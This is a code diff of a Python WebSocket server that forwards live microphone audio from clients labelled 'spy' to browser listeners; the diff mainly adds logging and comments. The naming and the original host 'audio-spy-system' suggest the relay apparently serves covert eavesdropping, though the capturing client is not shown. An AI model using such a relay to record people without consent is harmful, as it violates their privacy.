@@ -1,4 +1,4 @@
-import asyncio
+﻿import asyncio
 import json
 import os
 import time
@@ -10,7 +10,7 @@ listeners = set()
 
 app = web.Application()
 
-# Главная страница
+# Главная страница с РАБОЧИМ воспроизведением
 async def home(request):
     return web.Response(text="""
     <!DOCTYPE html>
@@ -167,13 +167,13 @@ async def home(request):
                 <div id="audioIndicator" class="audio-indicator">
                     <div style="font-size: 1.3rem;">🔊 Live Audio Streaming...</div>
                     <div style="margin-top: 10px;">Packets received: <span id="packetCount">0</span></div>
-                    <div>Buffer: <span id="bufferSize">0</span> chunks</div>
+                    <div>Buffer size: <span id="bufferSize">0</span> chunks</div>
                 </div>
                 
                 <div class="info-panel">
                     <div class="info-row">
                         <span>Server URL:</span>
-                        <span id="serverUrl">audio-spy-system.onrender.com</span>
+                        <span id="serverUrl">localhost:8000</span>
                     </div>
                     <div class="info-row">
                         <span>Audio Sources:</span>
@@ -192,28 +192,29 @@ async def home(request):
         </div>
 
         <script>
-            const WS_URL = 'wss://' + window.location.host + '/ws';
+            const WS_URL = 'ws://' + window.location.host + '/ws';
             let socket = null;
             let audioContext = null;
             let audioQueue = [];
             let isPlaying = false;
             let packetCount = 0;
+            let audioBufferSize = 0;
             
-            // Функция для обработки аудио
+            // Функция для правильного декодирования и воспроизведения аудио
             function processAudioData(base64Data) {
                 try {
-                    console.log("🎵 Processing audio data");
+                    console.log("🎵 Processing audio data, size:", base64Data.length);
                     
-                    // Декодируем base64
+                    // 1. Декодируем base64 в бинарные данные
                     const binaryStr = atob(base64Data);
                     const len = binaryStr.length;
                     
                     if (len < 100) {
-                        console.warn("⚠️ Too little data");
+                        console.warn("⚠️ Too little data:", len);
                         return null;
                     }
                     
-                    // Создаем ArrayBuffer
+                    // 2. Создаем ArrayBuffer и копируем данные
                     const arrayBuffer = new ArrayBuffer(len);
                     const uint8Array = new Uint8Array(arrayBuffer);
                     
@@ -221,15 +222,17 @@ async def home(request):
                         uint8Array[i] = binaryStr.charCodeAt(i);
                     }
                     
-                    // Создаем Int16Array
+                    // 3. Создаем Int16Array из ArrayBuffer (little-endian)
                     const int16Array = new Int16Array(arrayBuffer);
                     
-                    // Конвертируем в float32
+                    // 4. Конвертируем int16 в float32 (-1.0 до 1.0)
                     const float32Array = new Float32Array(int16Array.length);
                     for (let i = 0; i < int16Array.length; i++) {
+                        // int16: -32768 до 32767 → float32: -1.0 до 1.0
                         float32Array[i] = Math.max(-1, Math.min(1, int16Array[i] / 32768.0));
                     }
                     
+                    console.log("✅ Audio converted, samples:", int16Array.length);
                     return float32Array;
                     
                 } catch (error) {
@@ -238,14 +241,14 @@ async def home(request):
                 }
             }
             
-            // Воспроизведение из очереди
+            // Функция воспроизведения из очереди
             function playFromQueue() {
                 if (!audioContext) {
                     try {
                         audioContext = new (window.AudioContext || window.webkitAudioContext)({
                             sampleRate: 16000
                         });
-                        console.log("✅ AudioContext created");
+                        console.log("✅ AudioContext created, sample rate:", audioContext.sampleRate);
                     } catch (error) {
                         console.error("❌ Failed to create AudioContext:", error);
                         return;
@@ -273,21 +276,23 @@ async def home(request):
                     const source = audioContext.createBufferSource();
                     source.buffer = audioBuffer;
                     
-                    // GainNode для громкости
+                    // Создаем GainNode для контроля громкости
                     const gainNode = audioContext.createGain();
                     gainNode.gain.value = 1.0;
                     
-                    // Подключаем
+                    // Подключаем цепочку
                     source.connect(gainNode);
                     gainNode.connect(audioContext.destination);
                     
-                    // Запускаем
+                    // Запускаем воспроизведение
                     source.start();
                     
-                    // Следующий чанк
+                    // Когда завершится, воспроизводим следующий чанк
                     source.onended = () => {
                         setTimeout(playFromQueue, 0);
                     };
+                    
+                    console.log("▶️ Playing audio chunk, duration:", audioBuffer.duration.toFixed(3), "s");
                     
                 } catch (error) {
                     console.error("❌ Playback error:", error);
@@ -295,18 +300,21 @@ async def home(request):
                 }
             }
             
-            // Добавление аудио в очередь
+            // Функция для добавления аудио в очередь
             function addAudioToQueue(base64Data) {
                 const audioData = processAudioData(base64Data);
                 if (audioData) {
                     audioQueue.push(audioData);
                     
+                    // Если не воспроизводится, запускаем
                     if (!isPlaying) {
                         playFromQueue();
                     }
                     
+                    // Ограничиваем размер очереди
                     if (audioQueue.length > 10) {
                         audioQueue.shift();
+                        console.log("⚠️ Queue overflow, removing old chunk");
                     }
                 }
             }
@@ -338,6 +346,7 @@ async def home(request):
                 socket.onmessage = function(event) {
                     try {
                         const data = JSON.parse(event.data);
+                        console.log("📥 Received:", data.type, "size:", data.data ? data.data.length : 0);
                         
                         if (data.type === 'status') {
                             updateStatus(data.message, 'connected');
@@ -354,12 +363,15 @@ async def home(request):
                             document.getElementById('packetCount').textContent = packetCount;
                             document.getElementById('audioIndicator').classList.add('active');
                             
+                            // Обрабатываем и воспроизводим аудио
                             if (data.data && data.data.length > 100) {
                                 addAudioToQueue(data.data);
+                            } else {
+                                console.warn("⚠️ Audio packet too small:", data.data.length);
                             }
                         }
                     } catch (error) {
-                        console.error('❌ Error:', error);
+                        console.error('❌ Error processing message:', error);
                     }
                 };
                 
@@ -371,6 +383,8 @@ async def home(request):
                     document.getElementById('wsStatus').textContent = 'Disconnected';
                     
                     console.log("🔌 WebSocket closed");
+                    
+                    // Auto-reconnect after 3 seconds
                     setTimeout(connectWebSocket, 3000);
                 };
                 
@@ -395,10 +409,11 @@ async def home(request):
                 document.getElementById('sourcesCount').textContent = '0';
                 document.getElementById('bufferSize').textContent = '0';
                 
+                // Очищаем очередь
                 audioQueue = [];
                 isPlaying = false;
                 
-                console.log("⏹️ Disconnected");
+                console.log("⏹️ WebSocket disconnected manually");
             }
             
             function updateStatus(message, type) {
@@ -415,10 +430,10 @@ async def home(request):
                 }
             }
             
-            // Auto-connect
+            // Auto-connect on page load
             window.onload = function() {
                 document.getElementById('serverUrl').textContent = window.location.host;
-                console.log("🌐 Page loaded");
+                console.log("🌐 Page loaded, connecting...");
                 setTimeout(connectWebSocket, 1000);
             };
         </script>
@@ -443,92 +458,100 @@ async def websocket_handler(request):
     await ws.prepare(request)
     
     client_type = None
+    print(f"🆕 New connection from {request.remote}")
     
     try:
+        # Ждем первое сообщение
         async for msg in ws:
             if msg.type == web.WSMsgType.TEXT:
-                data = json.loads(msg.data)
-                
-                if data.get('type') == 'spy':
-                    client_type = 'spy'
-                    audio_sources.add(ws)
-                    print(f"🎤 Audio source connected")
+                try:
+                    data = json.loads(msg.data)
+                    print(f"📥 Received: {data.get('type')}")
                     
-                    for listener in listeners:
-                        if not listener.closed:
-                            await listener.send_str(json.dumps({
-                                'type': 'status',
-                                'message': f'Audio source available',
-                                'has_source': True,
-                                'sources_count': len(audio_sources)
-                            }))
-                    
-                    async for audio_msg in ws:
-                        if audio_msg.type == web.WSMsgType.TEXT:
+                    if data.get('type') == 'spy':
+                        client_type = 'spy'
+                        audio_sources.add(ws)
+                        print(f"🎤 Audio source connected. Total: {len(audio_sources)}")
+                        
+                        # Уведомляем слушателей
+                        for listener in listeners:
                             try:
-                                audio_data = json.loads(audio_msg.data)
-                                
-                                if audio_data.get('type') == 'audio':
-                                    # Пересылаем слушателям
-                                    for listener in list(listeners):
-                                        try:
-                                            if not listener.closed:
-                                                await listener.send_str(audio_msg.data)
-                                        except:
-                                            listeners.discard(listener)
+                                await listener.send_str(json.dumps({
+                                    'type': 'status',
+                                    'message': f'Audio source available ({len(audio_sources)} total)',
+                                    'has_source': True,
+                                    'sources_count': len(audio_sources)
+                                }))
+                            except:
+                                pass
+                        
+                        # Обрабатываем аудио
+                        async for audio_msg in ws:
+                            if audio_msg.type == web.WSMsgType.TEXT:
+                                try:
+                                    audio_data = json.loads(audio_msg.data)
+                                    
+                                    if audio_data.get('type') == 'audio':
+                                        data_len = len(audio_data.get('data', ''))
+                                        print(f"🎵 Audio #{audio_data.get('packet_id', 0)}, size: {data_len}")
                                         
-                            except Exception as e:
-                                print(f"❌ Error: {e}")
-                    
-                elif data.get('type') == 'listener':
-                    client_type = 'listener'
-                    listeners.add(ws)
-                    print(f"🎧 Listener connected")
-                    
-                    await ws.send_str(json.dumps({
-                        'type': 'status',
-                        'message': 'Ready for audio streaming' if audio_sources else 'Waiting for audio source',
-                        'has_source': len(audio_sources) > 0,
-                        'sources_count': len(audio_sources)
-                    }))
-                    
-                    try:
-                        async for _ in ws:
+                                        # Пересылаем слушателям
+                                        for listener in list(listeners):
+                                            try:
+                                                await listener.send_str(audio_msg.data)
+                                            except:
+                                                listeners.discard(listener)
+                                        
+                                except Exception as e:
+                                    print(f"❌ Audio processing error: {e}")
+                        
+                    elif data.get('type') == 'listener':
+                        client_type = 'listener'
+                        listeners.add(ws)
+                        print(f"🎧 Listener connected. Total: {len(listeners)}")
+                        
+                        # Отправляем статус
+                        await ws.send_str(json.dumps({
+                            'type': 'status',
+                            'message': 'Ready for audio streaming' if audio_sources else 'Waiting for audio source',
+                            'has_source': len(audio_sources) > 0,
+                            'sources_count': len(audio_sources)
+                        }))
+                        
+                        # Держим соединение
+                        try:
+                            async for _ in ws:
+                                pass
+                        except:
                             pass
-                    except:
-                        pass
+                        
+                except json.JSONDecodeError:
+                    print(f"❌ Invalid JSON")
     
     except Exception as e:
         print(f"❌ WebSocket error: {e}")
     
     finally:
-        if client_type == 'spy' and ws in audio_sources:
-            audio_sources.remove(ws)
-            print(f"🎤 Audio source disconnected")
-            
-            if not audio_sources:
-                for listener in listeners:
-                    if not listener.closed:
-                        await listener.send_str(json.dumps({
-                            'type': 'status',
-                            'message': 'No audio sources available',
-                            'has_source': False,
-                            'sources_count': 0
-                        }))
-                        
-        elif client_type == 'listener' and ws in listeners:
-            listeners.remove(ws)
-            print(f"🎧 Listener disconnected")
+        # Очистка
+        if client_type == 'spy':
+            audio_sources.discard(ws)
+            print(f"🎤 Audio source disconnected. Remaining: {len(audio_sources)}")
+        elif client_type == 'listener':
+            listeners.discard(ws)
+            print(f"🎧 Listener disconnected. Remaining: {len(listeners)}")
     
+    print(f"👋 Connection closed")
     return ws
 
-# Setup routes
+# Routes
 app.router.add_get('/', home)
 app.router.add_get('/health', health)
 app.router.add_get('/ws', websocket_handler)
 
-# Start server
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8000))
-    print(f"🚀 Server started on port {port}")
+    print(f"🚀 Audio Streaming Server started on port {port}")
+    print(f"🌐 Web interface: http://localhost:{port}")
+    print(f"📡 WebSocket: ws://localhost:{port}/ws")
+    print(f"🔧 Waiting for connections...")
     web.run_app(app, host='0.0.0.0', port=port)
